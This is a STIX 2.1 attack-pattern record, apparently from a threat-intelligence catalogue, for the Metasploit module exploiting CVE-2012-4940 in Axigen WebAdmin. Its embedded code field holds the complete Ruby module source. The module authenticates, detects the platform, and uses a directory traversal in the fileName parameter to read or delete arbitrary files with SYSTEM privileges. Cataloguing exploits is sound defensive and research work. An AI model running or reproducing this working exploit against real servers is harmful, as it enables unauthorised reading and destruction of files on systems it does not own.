{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8fa65eac-aa35-4e03-b160-0b22a0f17541",
    "created": "2024-08-14T16:23:23.792503Z",
    "modified": "2024-08-14T16:23:23.792507Z",
    "name": "Axigen Arbitrary File Read and Delete",
    "description": " This module exploits a directory traversal vulnerability in the WebAdmin interface of Axigen, which allows an authenticated user to read and delete arbitrary files with SYSTEM privileges. The vulnerability is known to work on Windows platforms. This module has been tested successfully on Axigen 8.10 over Windows 2003 SP2. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/axigen_file_access.rb",
            "external_id": "axigen_file_access.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-4940"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Axigen Arbitrary File Read and Delete',\n        'Description' => %q{\n          This module exploits a directory traversal vulnerability in the WebAdmin\n          interface of Axigen, which allows an authenticated user to read and delete\n          arbitrary files with SYSTEM privileges. The vulnerability is known to work on\n          Windows platforms. This module has been tested successfully on Axigen 8.10 over\n          Windows 2003 SP2.\n        },\n        'Author' => [\n          'Zhao Liang', # Vulnerability discovery\n          'juan vazquez' # Metasploit module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'US-CERT-VU', '586556' ],\n          [ 'CVE', '2012-4940' ],\n          [ 'OSVDB', '86802' ]\n        ],\n        'Actions' => [\n          ['Read', { 'Description' => 'Read remote file' }],\n          ['Delete', { 'Description' => 'Delete remote file' }]\n        ],\n        'DefaultAction' => 'Read',\n        'DisclosureDate' => '2012-10-31'\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(9000),\n        OptInt.new('DEPTH', [ true, 'Traversal depth if absolute is set to false', 4 ]),\n        OptString.new('TARGETURI', [ true, 'Path to Axigen WebAdmin', '/' ]),\n        OptString.new('USERNAME', [ true, 'The user to authenticate as', 'admin' ]),\n        OptString.new('PASSWORD', [ true, 'The password to authenticate with' ]),\n        OptString.new('PATH', [ true, 'The file to read or delete', '\\\\windows\\\\win.ini' ])\n      ]\n    )\n  end\n\n  def run\n    print_status('Trying to login')\n    if login\n      print_good('Login Successful')\n    else\n      print_error('Login failed, review USERNAME and PASSWORD options')\n      return\n    end\n\n    @traversal = '../' * 10\n    file = datastore['PATH']\n    @platform = get_platform\n\n    if @platform == 'windows'\n      @traversal.gsub!(%r{/}, '\\\\')\n      file.gsub!(%r{/}, '\\\\')\n    else # unix\n      print_error('*nix platform detected, vulnerability is only known to work on Windows')\n      return\n    end\n\n    case action.name\n    when 'Read'\n      read_file(datastore['PATH'])\n    when 'Delete'\n      delete_file(datastore['PATH'])\n    end\n  end\n\n  def read_file(file)\n    print_status('Retrieving file contents...')\n\n    res = send_request_cgi(\n      {\n        'uri' => normalize_uri(target_uri.path, 'sources', 'logging', 'page_log_file_content.hsp'),\n        'method' => 'GET',\n        'cookie' => \"_hadmin=#{@session}\",\n        'vars_get' => {\n          '_h' => @token,\n          'fileName' => \"#{@traversal}#{file}\"\n        }\n      }\n    )\n\n    if res && (res.code == 200) && res.headers['Content-Type'] && !res.body.empty?\n      store_path = store_loot('axigen.webadmin.data', 'application/octet-stream', rhost, res.body, file)\n      print_good(\"File successfully retrieved and saved on #{store_path}\")\n    else\n      print_error('Failed to retrieve file')\n    end\n  end\n\n  def delete_file(file)\n    print_status(\"Deleting file #{file}\")\n\n    res = send_request_cgi(\n      {\n        'uri' => normalize_uri(target_uri.path),\n        'method' => 'GET',\n        'cookie' => \"_hadmin=#{@session}\",\n        'vars_get' => {\n          '_h' => @token,\n          'page' => 'vlf',\n          'action' => 'delete',\n          'fileName' => \"#{@traversal}#{file}\"\n        }\n      }\n    )\n\n    if res && (res.code == 200) && res.body =~ (/View Log Files/)\n      print_good(\"File #{file} deleted\")\n    else\n      print_error(\"Error deleting file #{file}\")\n    end\n  end\n\n  def get_platform\n    print_status('Retrieving platform')\n\n    res = send_request_cgi(\n      {\n        'uri' => normalize_uri(target_uri.path),\n        'method' => 'GET',\n        'cookie' => \"_hadmin=#{@session}\",\n        'vars_get' => {\n          '_h' => @token\n        }\n      }\n    )\n\n    if res && (res.code == 200)\n      if res.body =~ /Windows/\n        print_good('Windows platform found')\n        return 'windows'\n      elsif res.body =~ /Linux/\n        print_good('Linux platform found')\n        return 'unix'\n      end\n    end\n\n    print_warning('Platform not found, assuming UNIX flavor')\n    return 'unix'\n  end\n\n  def login\n    res = send_request_cgi(\n      {\n        'uri' => normalize_uri(target_uri.path),\n        'method' => 'POST',\n        'vars_post' => {\n          'username' => datastore['USERNAME'],\n          'password' => datastore['PASSWORD'],\n          'submit' => 'Login',\n          'action' => 'login'\n        }\n      }\n    )\n\n    if res && (res.code == 303) && res.headers['Location'] =~ (/_h=([a-f0-9]*)/)\n      @token = ::Regexp.last_match(1)\n      if res.get_cookies =~ /_hadmin=([a-f0-9]*)/\n        @session = ::Regexp.last_match(1)\n        return true\n      end\n    end\n\n    return false\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-10-31"
}